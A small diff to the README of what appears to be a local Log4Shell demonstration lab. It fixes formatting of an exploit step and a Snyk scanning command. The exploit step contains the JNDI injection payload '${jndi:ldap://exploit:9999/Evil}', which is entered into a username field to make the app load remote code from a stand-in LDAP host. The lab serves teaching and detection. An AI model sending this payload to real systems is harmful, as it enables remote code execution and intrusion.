@@ -7,7 +7,7 @@ summary by [Snyk](https://github.com/snyk-labs/awesome-log4shell).
 ```docker-compose up```
 
 ### Exploit 1:
-Go go localhost:8080 and fill into username:
+Go go `localhost:8080` and fill username:
 
 ```${jndi:ldap://exploit:9999/Evil}```
 
@@ -18,8 +18,8 @@ Go go localhost:8080 and fill into username:
 
 ### Snyk
 ```
+snyk log4shell
 snyk test --all-projects
-snyk-log4shell
 ```
 
 ### Shell 1
